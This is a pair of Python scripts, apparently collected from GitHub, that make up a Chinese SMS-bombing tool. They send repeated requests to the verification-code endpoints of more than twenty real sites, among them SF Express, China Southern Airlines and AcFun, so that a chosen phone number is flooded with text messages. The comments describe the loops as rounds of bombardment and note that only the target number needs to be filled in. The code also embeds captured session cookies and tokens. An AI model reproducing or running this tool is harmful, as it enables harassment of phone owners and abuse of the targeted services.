import requests
import json
import time
import random

# post地址 post参数
APIS = [
    # CNMO
    {
        'url': 'http://passport.cnmo.com/index.php?c=Member_Ajax_Register&m=SendMessageCode&Jsoncallback=jQuery18306147606011785998_时间1&mobile=手机号码&type=5&_=时间2',
        'headers': {
            'Referer': 'http://passport.cnmo.com/'
        }
    },
    # 华测云
    {
        'url': 'https://cloud.huace.cn/ChcnavCloudAuth/code/sms?mobile=手机号码',
    },
    # yingsheng
    {
        'url': 'https://sso.yingsheng.com/crosApi',
        'body': 'Cs25"sso_getRegisterMobileCode"a1{s11"手机号码"}z',
    },
    # 51sxue
    {
        'url': 'http://www.51sxue.com/index.php',
        'body': {
            'app': 'member', 'act': 'regPhone', 'phone': '手机号码', 'username': '456dadad'
        }
    },
    # yespmp
    {
        'url': 'https://admin.yespmp.com/YespmpWeb/registerSendCode',
        'body': {
            'phone': '手机号码'
        }
    },
    # 秘塔写作
    {
        'url': 'https://xiezuocat.com/verify?type=signup',
        'payload': True,
        'body': {
            'phone': '86-手机号码'
        }
    },
]


def sendSMS(API, phone):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
    }
    if API.get('headers'):
        headers.update(API.get('headers'))
    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time() * 1000))).replace("时间2", str(
        int(time.time() * 1000)))
    body = API.get('body')
    try:
        if body:
            body = eval(str(body).replace("手机号码", phone)) if isinstance(body, dict) else body.replace("手机号码", phone)
            if API.get('payload'):
                body = json.dumps(body)
            r = requests.post(url, body, headers=headers)
        else:
            r = requests.get(url, headers=headers)
        # print(r.status_code)
        # print(r.text)
        # print(json.loads(r.text))
    except:
        ...


def main(phone):
    i = 0
    while i < 2:
        for API in APIS:
            sendSMS(API, phone)
            time.sleep(random.randint(1, 3))
        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i + 1}轮轰炸！")
        time.sleep(60)
        i += 1


if __name__ == '__main__':
    # 手机号
    phone = 'xxx'
    # sendSMS(APIS[-1], phone)
    main(phone)

---------------------------------------分割线---------------------------------（xxx处改手机号码即可，本码3条可用接口）###1.英盛网 2.秘塔科技 3.CNMO

import json
import requests as r
import time


class PostRequest:
    def run(self):
        print("#" * 10 + self.name + "#" * 10)
        try:
            response = r.post(url=self.url, data=self.data, headers=self.header)
            print("[*] Send Request Success ")
            print("[*] Status code: {}".format(response))
            print("[*] Content: " + response.text)
        except:
            print("[-] Send Request Fail ")
        time.sleep(sleep)


class PostRequest_json:
    def run(self):
        print("#" * 10 + self.name + "#" * 10)
        try:
            response = r.post(url=self.url, data=json.dumps(self.data), headers=self.header)
            print("[*] Send Request Success ")
            print("[*] Status code: {}".format(response))
            print("[*] Content: " + response.text)
        except:
            print("[-] Send Request Fail ")
        time.sleep(sleep)


class GetRequest:
    def run(self):
        print("#" * 10 + self.name + "#" * 10)
        try:
            response = r.get(url=self.url, headers=self.header)
            print("[*] Send Request Success ")
            print("[*] Status code: {}".format(response))
            print("[*] Content: " + response.text)
        except:
            print("[-] Send Request Fail ")
        time.sleep(sleep)


class SMS_Send_1(PostRequest_json):
    # 60s
    def __init__(self, phone):
        self.name = "顺丰速运"
        self.phone = phone
        self.url = "https://v.sf-express.com/portal-sfkey/user/signin"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "https://v.sf-express.com/sf/?switchTab=register",
            "Content-Type": "application/json;charset=utf-8"
        }
        self.data = {
            "requestNo": phone,
            "verificationSource": ""
        }


class SMS_Send_2(PostRequest_json):
    def __init__(self, phone):
        # 30s
        self.name = "上海信贵汽车服务有限公司(担路)"
        self.url = "http://www.shxgzc.com/capi/v1/company_account/send_siteuser_signup_token"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "http://www.shxgzc.com/account/signup/?next=/",
            "Content-Type": "application/json;charset=utf-8"
        }
        self.data = {
            "mobile": str(phone)
        }


class SMS_Send_3(PostRequest):
    # 60s
    def __init__(self, phone):
        self.name = "易车"
        self.phone = phone
        self.url = "http://www.bitauto.com/feedback/ajax/FeedbackSendCode.ashx"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "http://www.bitauto.com/feedback/",
            "Content-Type": "application/x-www-form-urlencoded;charset = UTF-8",
            "Cookie": "XCWEBLOG_testcookie=yes;CIGDCID=886c9cc94b1946269d295460a9d7262d-yiche;\
ASP.NET_SessionId=zibw5xn2q1dywmtmqw0tcvre;locatecity=320500;bitauto_ipregion=121.236.203\
.64%3a%e6%b1%9f%e8%8b%8f%e7%9c%81%e8%8b%8f%e5%b7%9e%e5%b8%82%3\
b1502%2c%e8%8b%8f%e5%b7%9e%e5%b8%82%2csuzhou"
        }
        self.data = {
            "Mobile": phone,
            "action": "SendCode",
            "Code": "%E8%AF%B7%E8%BE%93%E5%85%A5%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81"
        }


class SMS_Send_4(GetRequest):
    def __init__(self, phone):
        # 60s
        self.name = "澳门航空"
        self.url = "https://mp.airmacau.com.cn/sms/code/86-" + str(phone) + "/en-US?_t=1581701618"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "https://www.airmacau.com.mo/",
            "Origin": "https://www.airmacau.com.mo"
        }


class SMS_Send_5(GetRequest):
    def __init__(self, phone):
        # 60s
        self.name = "Ac Fun弹幕网"
        self.url = "https://id.app.acfun.cn/rest/web/login/sms/send?mobile=" + str(phone) + "&type=6&"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "https://www.acfun.cn/reg/?returnUrl=https%3A%2F%2Fwww.acfun.cn%2F",
            "Origin": "https://www.acfun.cn"
        }


class SMS_Send_6(GetRequest):
    def __init__(self, phone):
        # 60s
        self.name = "乐教乐学"
        self.url = "http://id.lejiaolexue.com/api/sendvericode.ashx?phone=" + str(phone)
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            'Referer': 'http://www.lejiaolexue.com/',
            'Origin': 'http://www.lejiaolexue.com'
        }


class SMS_Send_7(PostRequest):
    def __init__(self, phone):
        # 60s
        self.name = "中国营养学会"
        self.url = "http://user.cnsoc.org/Reg/_RegHandler.html"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "http://user.cnsoc.org/Reg/userReg.html",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "YqMark_Web=W+5fOFaDuY3eWX3B4ESV7/Ghp0XqMEEx7A+i3rWUk9s=; ASP.NET_SessionId=sovzh3t24evqr4hftdt0iwv0"
        }
        self.data = {
            'action': 'phonecode',
            'phone': str(phone),
            'post': '1'
        }


class SMS_Send_8(PostRequest):
    def __init__(self, phone):
        # 60s     每天三次
        self.name = "四季教育平台"
        self.url = "http://student.sijiedu.com/includes/sendregSmsCode.php"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "http://student.sijiedu.com/index.php?m=reg",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            'Cookie': "PHPSESSID=9kcui76v7g500hh80b9l4m04b5"
        }
        self.data = {
            'tel': str(phone),
            'siji1': '274622',
            'siji2': '1581867243',
            'siji3': '81b65b5288fe762372cee72f9c623bf0'
        }


class SMS_Send_9(PostRequest_json):
    def __init__(self, phone):
        # 60s
        self.name = "新科教育"
        self.url = "https://www.xkpx.com/zhuce/GetValidataCode/"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "https://www.xkpx.com/zhuce/",
            "Content-Type": "application/json;charset=utf-8"
        }
        self.data = {
            'tel': phone
        }


class SMS_Send_10(PostRequest):
    def __init__(self, phone):
        # 60s
        self.name = "云杏HIS系统(九明珠)"
        self.url = "http://www.yhis999.cn/yunhis/register.do?act=lable&type=yzm"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "http://www.yhis999.cn/yunhis/register.do?act=query",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
        }
        self.data = {
            'lxdh': phone
        }


class SMS_Send_11(GetRequest):
    # 60s
    def __init__(self, phone):
        self.name = "心动网络"
        self.phone = phone
        url1 = "https://www.xd.com/users/sendRegisterCode"
        url2 = "?callback=jQuery1102012722385873258624_1581693197433&"
        url3 = "mobile=" + str(phone) + "&area_code=86&_=1581693197434"
        self.url = url1 + url2 + url3
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
        }


class SMS_Send_12(PostRequest_json):
    def __init__(self, phone):
        # 30s
        self.name = "全鸣影视(担路)"
        self.url = "http://www.qmyssh.com/capi/v1/company_account/send_siteuser_signup_token"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "http://www.qmyssh.com/account/signup/",
            "Content-Type": "application/json;charset=utf-8"
        }
        self.data = {
            "mobile": str(phone)
        }


class SMS_Send_13(PostRequest_json):
    def __init__(self, phone):
        # 30s
        self.name = "南方航空"
        self.url = "https://skypearl.csair.com/skypearl/register/send"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "https://skypearl.csair.com/skypearl/register.html?lang=zh",
            "Content-Type": "application/json;charset=utf-8"
        }
        self.data = {
            "contactNo": str(phone),
            "countriesCode": "86",
            "language": "ZH",
            "tokenId": "ekIaOrkmwxOAiUGbJeXoZpy4vO5V3wni"
        }


class SMS_Send_14(PostRequest):
    def __init__(self, phone):
        # 60s
        self.name = "毛豆新车网(千场红包)"
        self.url = "https://www.maodou.com/promotion/coupon/send_verify_code"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "https://www.maodou.com",
            'Origin': 'https://www.maodou.com',
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Cookie": "track_id=44851483602460672; XC-XSRF-TOKEN=eyJpdiI6IlNSRnJxclFTOVRocFdrWURwM1dFVkE\
9PSIsInZhbHVlIjoiOHJWdmJWUlNwa1dyNFl3OTlINlBcLzAxRWMzYUVTNDQyZnZMenBHM3R4RGs5VVhTNm0zdDdHNXJ2SXJUMnpaT3d\
3UHRnWXNVd0VCNkRRdko5Sm04RGpRPT0iLCJtYWMiOiIwMDRmYTQzZjlmYWM3YWI1MjA0MTMxNDhmNTFhM2VmNWRjMzQ2Mjk2OGFlZWE0Mz\
A2ZTg3MDcyZTJhNDMwNWVkIn0%3D; uuid=0d06e317-9f63-4e3c-f3c4-20cabb800d43; sessionid=04fbd273-ebbc-490b-d501-\
641f73090524; cainfo=%7B%22ca_s%22%3A%22pz_baidu%22%2C%22ca_n%22%3A%22shouye_abtest%22%2C%22ca_medium%22%3A\
%22%22%2C%22ca_term%22%3A%22%22%2C%22ca_content%22%3A%22%22%2C%22ca_campaign%22%3A%22%22%2C%22ca_kw%22%3A%\
22%25e6%25af%259b%25e8%25b1%2586%25e6%2596%25b0%25e8%25bd%25a6%22%2C%22keyword%22%3A%22%22%2C%22ca_keywordid\
%22%3A%22%22%2C%22scode%22%3A%22%22%2C%22ca_transid%22%3A%22%22%2C%22platform%22%3A%221%22%2C%22version%22%3A\
%221%22%2C%22track_id%22%3A%2244851483602460672%22%7D; cityDomain=www; location=%7B%22name%22%3A%22%E5%85%A8%E\
5%9B%BD%22%2C%22id%22%3A%220%22%2C%22domain%22%3A%22www%22%7D; Hm_lvt_7de7982ae2fe8226276dd86c423623c5=158184863\
9; guazi_xinche_session=eyJpdiI6ImJ5Q0FGbHBPdmJDMlRkSUdneEc1blE9PSIsInZhbHVlIjoiUTRtZ1RxeUNOMVd5XC9IeXpIUlhDMXZOZ\
DhneittcHk4UzdNRUVkbjhFRW91WkJldk1oNkM2Y0ZzUUVaSVZQTDhkeXRsSitGNGtJbGdqVzFhaml4aHl3PT0iLCJtYWMiOiJiNGQ0ZTc1NzcyOTV\
hMTc1YzQyMjNkOWU0NGIxMGUxMjRhMjYzOTkzMzliMTdhZjE5YzU5ODM2ZTI3OWY5ODVlIn0%3D; Hm_lpvt_7de7982ae2fe8226276dd86c423623\
c5=1581848728"
        }
        self.data = {
            'phone': phone
        }


class SMS_Send_15(GetRequest):
    # 60s
    def __init__(self, phone):
        self.name = "毛豆新车网(优惠)"
        self.phone = phone
        self.url = "https://uc.maodou.com/server/account/sendLoginCode?phone=" + str(phone)
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "https://www.maodou.com/",
            "Origin": "https://www.maodou.com"
        }


class SMS_Send_16(PostRequest):
    def __init__(self, phone):
        # 60s
        self.name = "云森客"
        self.url = "https://www.yunsenke.com/apis/getSmsPhoneCode"
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Referer": "https://www.yunsenke.com/Index/regists",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
        }
        self.data = {
            'phone': phone
        }


# sleep发送短信的间隔不建议低于4s
# tel要发送短信的号码
# number大约轰炸总次数

sleep = 5
tel = xxx
number = 100

if __name__ == '__main__':
    sms1 = SMS_Send_1(tel)
    sms2 = SMS_Send_2(tel)
    sms3 = SMS_Send_3(tel)
    sms4 = SMS_Send_4(tel)
    sms5 = SMS_Send_5(tel)
    sms6 = SMS_Send_6(tel)
    sms7 = SMS_Send_7(tel)
    sms8 = SMS_Send_8(tel)
    sms9 = SMS_Send_9(tel)
    sms10 = SMS_Send_10(tel)
    sms11 = SMS_Send_11(tel)
    sms12 = SMS_Send_12(tel)
    sms13 = SMS_Send_13(tel)
    sms14 = SMS_Send_14(tel)
    sms15 = SMS_Send_15(tel)
    sms16 = SMS_Send_16(tel)

    i = 0
    while int(number / 13) > i:
        # 可能会有些失败次数，所以除13保守
        i += 1
        sms1.run()
        sms2.run()  # 30s
        sms3.run()
        sms4.run()
        sms5.run()
        sms6.run()
        sms7.run()
        sms8.run()
        sms9.run()
        sms10.run()
        sms11.run()
        sms12.run()
        sms13.run()
        sms14.run()
        sms15.run()
        sms16.run()


---------------------分割线-----------（xxx换成手机号即可，本代码有效2接口）###1.乐教乐学 2.九明珠

测试网址：https://www.w3cschool.cn/tryrun/runcode?lang=python3

以上代码均源自GitHub
   